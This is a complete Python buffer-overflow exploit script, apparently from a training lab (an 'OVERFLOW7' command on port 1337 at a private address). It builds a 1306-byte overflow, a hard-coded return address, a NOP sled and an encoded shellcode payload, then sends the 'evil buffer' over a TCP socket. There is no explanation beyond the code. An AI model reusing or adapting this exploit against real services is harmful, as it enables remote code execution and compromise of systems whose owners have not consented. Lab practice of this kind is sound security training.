#!/usr/bin/env python3

import socket

ip = "10.10.5.108"
port = 1337

prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
retn = "\xdf\x11\x50\x62" # 625011df
padding = "\x90" * 16
payload = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xc5\x20\x48\xe5\x83\xee\xfc\xe2\xf4\x39\xc8\xca\xe5\xc5\x20"
"\x28\x6c\x20\x11\x88\x81\x4e\x70\x78\x6e\x97\x2c\xc3\xb7\xd1"
"\xab\x3a\xcd\xca\x97\x02\xc3\xf4\xdf\xe4\xd9\xa4\x5c\x4a\xc9"
"\xe5\xe1\x87\xe8\xc4\xe7\xaa\x17\x97\x77\xc3\xb7\xd5\xab\x02"
"\xd9\x4e\x6c\x59\x9d\x26\x68\x49\x34\x94\xab\x11\xc5\xc4\xf3"
"\xc3\xac\xdd\xc3\x72\xac\x4e\x14\xc3\xe4\x13\x11\xb7\x49\x04"
"\xef\x45\xe4\x02\x18\xa8\x90\x33\x23\x35\x1d\xfe\x5d\x6c\x90"
"\x21\x78\xc3\xbd\xe1\x21\x9b\x83\x4e\x2c\x03\x6e\x9d\x3c\x49"
"\x36\x4e\x24\xc3\xe4\x15\xa9\x0c\xc1\xe1\x7b\x13\x84\x9c\x7a"
"\x19\x1a\x25\x7f\x17\xbf\x4e\x32\xa3\x68\x98\x48\x7b\xd7\xc5"
"\x20\x20\x92\xb6\x12\x17\xb1\xad\x6c\x3f\xc3\xc2\xdf\x9d\x5d"
"\x55\x21\x48\xe5\xec\xe4\x1c\xb5\xad\x09\xc8\x8e\xc5\xdf\x9d"
"\xb5\x95\x70\x18\xa5\x95\x60\x18\x8d\x2f\x2f\x97\x05\x3a\xf5"
"\xdf\x8f\xc0\x48\x42\xe1\xed\xf8\x20\xe7\xc5\x31\x14\x6c\x23"
"\x4a\x58\xb3\x92\x48\xd1\x40\xb1\x41\xb7\x30\x40\xe0\x3c\xe9"
"\x3a\x6e\x40\x90\x29\x48\xb8\x50\x67\x76\xb7\x30\xad\x43\x25"
"\x81\xc5\xa9\xab\xb2\x92\x77\x79\x13\xaf\x32\x11\xb3\x27\xdd"
"\x2e\x22\x81\x04\x74\xe4\xc4\xad\x0c\xc1\xd5\xe6\x48\xa1\x91"
"\x70\x1e\xb3\x93\x66\x1e\xab\x93\x76\x1b\xb3\xad\x59\x84\xda"
"\x43\xdf\x9d\x6c\x25\x6e\x1e\xa3\x3a\x10\x20\xed\x42\x3d\x28"
"\x1a\x10\x9b\xa8\xf8\xef\x2a\x20\x43\x50\x9d\xd5\x1a\x10\x1c"
"\x4e\x99\xcf\xa0\xb3\x05\xb0\x25\xf3\xa2\xd6\x52\x27\x8f\xc5"
"\x73\xb7\x30")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")